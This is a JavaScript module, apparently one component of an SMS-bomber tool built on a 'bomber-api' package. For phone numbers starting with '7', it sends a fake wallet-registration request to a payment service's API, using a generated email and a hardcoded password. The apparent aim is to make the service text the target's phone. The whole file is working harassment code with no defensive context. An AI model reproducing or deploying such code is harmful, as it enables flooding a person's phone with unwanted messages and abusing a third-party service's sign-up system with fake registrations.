const request = require("request");
const tools = require("bomber-api")

module.exports.run = function(number){
	if(number.toString().startsWith('7')){
		request.post({
			url:'https://restapi.profee.com/api/v1/wallets?PHONE=79863648651',
				form: {
					email: tools.mailGen(),
					password:`kamBet1k!!`,
					phone: `${number}`,
					source: {
                        platform: "SITE",
                        scenario:"REGISTRATION",
                        referer:"www"
                    }
                }
				}, 
			function(err, res, json) {
				/**/
			})
	}
}
